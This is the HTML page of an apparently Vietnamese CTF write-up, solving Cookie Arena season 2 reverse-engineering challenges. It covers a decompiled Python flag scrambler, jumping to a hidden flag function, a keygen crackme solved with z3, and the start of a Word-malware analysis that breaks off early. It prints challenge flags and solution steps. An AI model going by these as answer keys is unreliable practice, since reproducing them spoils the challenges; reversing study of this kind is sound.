@@ -1,0 +1,1272 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Clear Reverse Engineering giải Cookie Arena mùa 2'>
+<title>Cookie Arena 2 | Reverse Engineering</title>
+
+<link rel='canonical' href='/p/cookie-arena-2-reverse-engineering/'>
+
+<link rel="stylesheet" href="/scss/style.min.24ef1cc321916467896e8c70c10c0ad7b98c2a8df14298032fb637216e397f50.css"><meta property='og:title' content='Cookie Arena 2 | Reverse Engineering'>
+<meta property='og:description' content='Clear Reverse Engineering giải Cookie Arena mùa 2'>
+<meta property='og:url' content='/p/cookie-arena-2-reverse-engineering/'>
+<meta property='og:site_name' content='Spid3r&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='reverse' /><meta property='article:published_time' content='2023-07-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-07-09T00:00:00&#43;00:00'/><meta property='og:image' content='/p/cookie-arena-2-reverse-engineering/featured.png' />
+<meta name="twitter:title" content="Cookie Arena 2 | Reverse Engineering">
+<meta name="twitter:description" content="Clear Reverse Engineering giải Cookie Arena mùa 2"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/cookie-arena-2-reverse-engineering/featured.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu00444b9dc497f000ae7c4bf05fddc77b_89774_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">👾</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spid3r&#39;s Blog</a></h1>
+            <h2 class="site-description">I&#39;ll use this site to share writeups of CTFs or post articles related to cybersecurity.</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spid3r1337'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/spid3r1337'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#pyreverse">Pyreverse</a></li>
+    <li><a href="#jump">Jump</a>
+      <ol>
+        <li><a href="#phân-tích-file">Phân tích file</a></li>
+        <li><a href="#tìm-địa-chỉ-_flag-và-lấy-flag">Tìm địa chỉ <code>_flag</code> và lấy flag</a></li>
+      </ol>
+    </li>
+    <li><a href="#rev1">Rev1</a>
+      <ol>
+        <li><a href="#phân-tích-file-1">Phân tích file</a></li>
+        <li><a href="#winmain">WinMain</a></li>
+        <li><a href="#debug">Debug</a></li>
+      </ol>
+    </li>
+    <li><a href="#cv-malware">CV Malware</a>
+      <ol>
+        <li><a href="#phân-tích-file-2">Phân tích file</a></li>
+        <li><a href="#unzip--check">Unzip &amp; check</a></li>
+        <li><a href="#decode">Decode</a></li>
+        <li><a href="#clientexe">client.exe</a></li>
+        <li><a href="#bắt-tương-tác-giữa-client-với-host-thông-qua-wireshark">Bắt tương tác giữa client với host thông qua Wireshark</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/cookie-arena-2-reverse-engineering/">
+                <img src="/p/cookie-arena-2-reverse-engineering/featured_hu1d606a7f3123979285701cf8aea1cd37_774107_800x0_resize_box_3.png"
+                        srcset="/p/cookie-arena-2-reverse-engineering/featured_hu1d606a7f3123979285701cf8aea1cd37_774107_800x0_resize_box_3.png 800w, /p/cookie-arena-2-reverse-engineering/featured_hu1d606a7f3123979285701cf8aea1cd37_774107_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="423" 
+                        loading="lazy"
+                        alt="Featured image of post Cookie Arena 2 | Reverse Engineering" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/writeups/" >
+                Writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/cookie-arena-2-reverse-engineering/">Cookie Arena 2 | Reverse Engineering</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Clear Reverse Engineering giải Cookie Arena mùa 2
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 09, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="pyreverse">Pyreverse</h2>
+<blockquote>
+<p>Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.</p>
+</blockquote>
+<p>Sử dụng <a class="link" href="https://github.com/serfend/pydumpck"  target="_blank" rel="noopener"
+    >pydumpck</a> để decompile <code>exe</code> &ndash;&gt; <code>py</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># pyreverser.pyc.cdc.py</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reverse_string</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scramble_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scrambled</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">scrambled</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="n">scrambled</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">scrambled</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret_flag</span> <span class="o">=</span> <span class="n">scramble_flag</span><span class="p">(</span><span class="n">reverse_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Welcome to PyReverser!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Please enter a word or phrase:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user_input</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">generated_value</span> <span class="o">=</span> <span class="n">scramble_flag</span><span class="p">(</span><span class="n">reverse_string</span><span class="p">(</span><span class="n">user_input</span><span class="o">.</span><span class="n">upper</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Generated value:&#39;</span><span class="p">,</span> <span class="n">generated_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Can you find the hidden flag?&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">reversed_flag</span> <span class="o">=</span> <span class="n">reverse_string</span><span class="p">(</span><span class="n">secret_flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Reversed flag:&#39;</span><span class="p">,</span> <span class="n">reversed_flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Để ý flag được decode từ đoạn base64 bên trên</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@Spid3r:~# <span class="nb">echo</span> <span class="s1">&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;</span> <span class="p">|</span> base64 -d   
+</span></span><span class="line"><span class="cl">CHH<span class="o">{</span>python2Exi_Reverse_ENginering<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="jump">Jump</h2>
+<blockquote>
+<p>Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong​</p>
+</blockquote>
+<h3 id="phân-tích-file">Phân tích file</h3>
+<p>Để ý rằng đây chỉ là 1 file exe có thể decompile 1 cách đơn giản (Ở đây thì mình chẳng thấy có chỗ nào gọi là sinh key bản quyền phần mềm cả)</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image.png"
+	width="1610"
+	height="363"
+	srcset="/p/cookie-arena-2-reverse-engineering/image_hu8e39eb7651936f4ff8d56574c8a3386c_175368_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image_hu8e39eb7651936f4ff8d56574c8a3386c_175368_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="443"
+		data-flex-basis="1064px"
+	
+></p>
+<p>Lợi dụng chạy hàm <code>_flag</code> bằng cách nhập ​địa chỉ <code>_flag</code> vào ô nhập khi chạy jump.exe</p>
+<h3 id="tìm-địa-chỉ-_flag-và-lấy-flag">Tìm địa chỉ <code>_flag</code> và lấy flag</h3>
+<ul>
+<li>Cách 1 (tìm trực tiếp địa chỉ _flag thông qua đoạn mã được dump)</li>
+</ul>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-3.png"
+	width="895"
+	height="180"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-3_hu0577eb2f141f2263788d35130cbe214e_99109_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-3_hu0577eb2f141f2263788d35130cbe214e_99109_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="497"
+		data-flex-basis="1193px"
+	
+></p>
+<ul>
+<li>Cách 2 (Sử dụng edit function để kiểm tra địa chỉ hàm flag)</li>
+</ul>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-2.png"
+	width="622"
+	height="269"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-2_hucb53687cc737718ee2c067f540f8b4d0_45939_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-2_hucb53687cc737718ee2c067f540f8b4d0_45939_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="554px"
+	
+></p>
+<p>Lưu ý: địa chỉ <code>00401500</code> đang ở hexa &ndash;&gt; đổi sang decimal là <code>4199680​</code></p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-1.png"
+	width="756"
+	height="189"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-1_hu47aaf929cc40273fe69bf3de706cd426_57904_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-1_hu47aaf929cc40273fe69bf3de706cd426_57904_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="400"
+		data-flex-basis="960px"
+	
+></p>
+<h2 id="rev1">Rev1</h2>
+<blockquote>
+<p>Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.</p>
+</blockquote>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image12.png"
+	width="369"
+	height="336"
+	srcset="/p/cookie-arena-2-reverse-engineering/image12_hu1400eba19f01779c66e4087de41ec934_8072_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image12_hu1400eba19f01779c66e4087de41ec934_8072_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="109"
+		data-flex-basis="263px"
+	
+></p>
+<h3 id="phân-tích-file-1">Phân tích file</h3>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-5.png"
+	width="1216"
+	height="120"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-5_hu3056d99746cc208521af00fa139614e7_192531_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-5_hu3056d99746cc208521af00fa139614e7_192531_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1013"
+		data-flex-basis="2432px"
+	
+></p>
+<p><code>PE32</code> &ndash;&gt; 32 bits</p>
+<p><code>GUI</code> &ndash;&gt; WinMain</p>
+<h3 id="winmain">WinMain</h3>
+<ul>
+<li>Xử lý I/O</li>
+</ul>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-6.png"
+	width="939"
+	height="497"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-6_huef2740d153d915af82f5efa9c9005592_198350_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-6_huef2740d153d915af82f5efa9c9005592_198350_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="188"
+		data-flex-basis="453px"
+	
+></p>
+<p>Kiểm tra trong <code>DialogBoxParamA</code></p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-7.png"
+	width="784"
+	height="386"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-7_hu6dd93cabab55686be7d3d37db0848903_118629_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-7_hu6dd93cabab55686be7d3d37db0848903_118629_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="DialogBoxParamA"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="487px"
+	
+></p>
+<p>Hàm <code>GetItemTextA</code> sẽ lấy các string được input vào và check key qua <code>sub_402030</code></p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-8.png"
+	width="599"
+	height="678"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-8_hu98854747e9056abd36bb50c5bc983256_152683_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-8_hu98854747e9056abd36bb50c5bc983256_152683_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="sub_402030"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="88"
+		data-flex-basis="212px"
+	
+></p>
+<p>Kiểm tra hàm này thì thấy rằng <code>dword_414448</code> chưa được khởi tạo vì vậy chúng ta sẽ debug để xem nó là gì (xem video dưới đây)</p>
+<h3 id="debug">Debug</h3>
+<div class="video-wrapper">
+    <video
+    controls
+    src="media1.mp4"
+    poster="./video-poster.png"
+    
+    >
+        <p>
+            Your browser doesn't support HTML5 video. Here is a
+            <a href="media1.mp4">link to the video</a> instead.
+        </p>
+    </video>
+</div>
+
+<p>Dựa vào những gì debug được có thể viết lại đoạn code dưới đây:</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image19.png"
+	width="1137"
+	height="866"
+	srcset="/p/cookie-arena-2-reverse-engineering/image19_hufa1fbf41b99450242ea98ee74b128ec8_653444_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image19_hufa1fbf41b99450242ea98ee74b128ec8_653444_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="131"
+		data-flex-basis="315px"
+	
+></p>
+<p>Đến đây thì chỉ đơn giản là dùng z3 để viết script giải <a class="link" href="solve_rev1.py" >solve_rev1.py</a> để lấy key</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image20.png"
+	width="355"
+	height="293"
+	srcset="/p/cookie-arena-2-reverse-engineering/image20_hu7303a1b64d043676e06fd7148e64c9c3_11342_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image20_hu7303a1b64d043676e06fd7148e64c9c3_11342_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="flag"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="290px"
+	
+></p>
+<h2 id="cv-malware">CV Malware</h2>
+<blockquote>
+<p>Thời gian gần đây có nhiều hình thức xâm nhập vào máy tính nạn nhân thông qua mã độc được gắn trong file Word. Khi mã độc thực thi, chúng sẽ lấy thông tin của nạn nhân để gửi về máy chủ điều khiển C&amp;C. Liệu hacker cũng có thể thể bị hack, hãy cùng đi săn kẻ xấu nhé!</p>
+</blockquote>
+<p>Mang tiếng Malware nhưng là bài duy nhất rev tải về không bị Windows tự động phát hiện và xoá :))</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image22.png"
+	width="258"
+	height="302"
+	srcset="/p/cookie-arena-2-reverse-engineering/image22_hu14024a727f2bf402fa2647273e93007c_6556_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image22_hu14024a727f2bf402fa2647273e93007c_6556_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="File Word của challenge"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="85"
+		data-flex-basis="205px"
+	
+></p>
+<h3 id="phân-tích-file-2">Phân tích file</h3>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image23-1.png"
+	width="494"
+	height="87"
+	srcset="/p/cookie-arena-2-reverse-engineering/image23-1_hu3a84b2b9d6e22919e512d630ef2137f4_13657_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image23-1_hu3a84b2b9d6e22919e512d630ef2137f4_13657_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="567"
+		data-flex-basis="1362px"
+	
+></p>
+<p>Dựa vào kiểm tra header của file thì linux cho rằng đây là 1 file Word (nhưng thực chất Word được cấu tạo như 1 file Zip)</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-9.png"
+	width="1209"
+	height="378"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-9_hu0505b02042220cc736da79f91fb49215_485453_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-9_hu0505b02042220cc736da79f91fb49215_485453_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="319"
